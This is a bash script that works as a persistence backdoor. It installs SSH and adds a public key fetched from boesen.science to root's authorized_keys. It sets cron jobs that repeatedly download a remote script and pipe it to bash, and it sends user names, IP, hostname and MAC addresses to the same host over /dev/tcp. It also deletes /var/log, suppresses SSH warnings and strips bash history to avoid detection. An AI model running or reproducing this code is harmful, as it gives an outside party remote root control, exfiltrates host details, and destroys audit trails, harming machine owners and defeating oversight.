#!/usr/bin/bash

sudo apt-get install openssh-server -y
sudo systemctl start ssh.service
sudo systemctl enable ssh.service

SSHPATH="/root/.ssh"

sudo mkdir -p "$SSHPATH"

echo "Downloading pubkey..."
sudo su -c "curl -L boesen.science:2042/pubkey >> $SSHPATH/authorized_keys"

sudo su -c "(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash') | crontab -"
sudo su -c "printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"

# Don't use whoami, will generally be root, which is useless
USER=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
# hostname -I returns trailing space
IP=$(hostname -I | sed 's/ *$//')
HOSTNAME=$(hostname)
MAC=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')

SERVER="boesen.science"
PORT=2043

exec 3<>/dev/tcp/$SERVER/$PORT
printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3

cat <&3

printf "$IP" > /tmp/ip

# On Raspberry Pi, prevent "SSH open with default password" warning
sudo rm -rf /etc/profile.d/sshpwd.sh /etc/xdg/lxsession/LXDE-pi/sshpwd.sh /var/log/*
# Remove last line of bash history to prevent detection if typed into terminal
sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history

clear;clear;clear
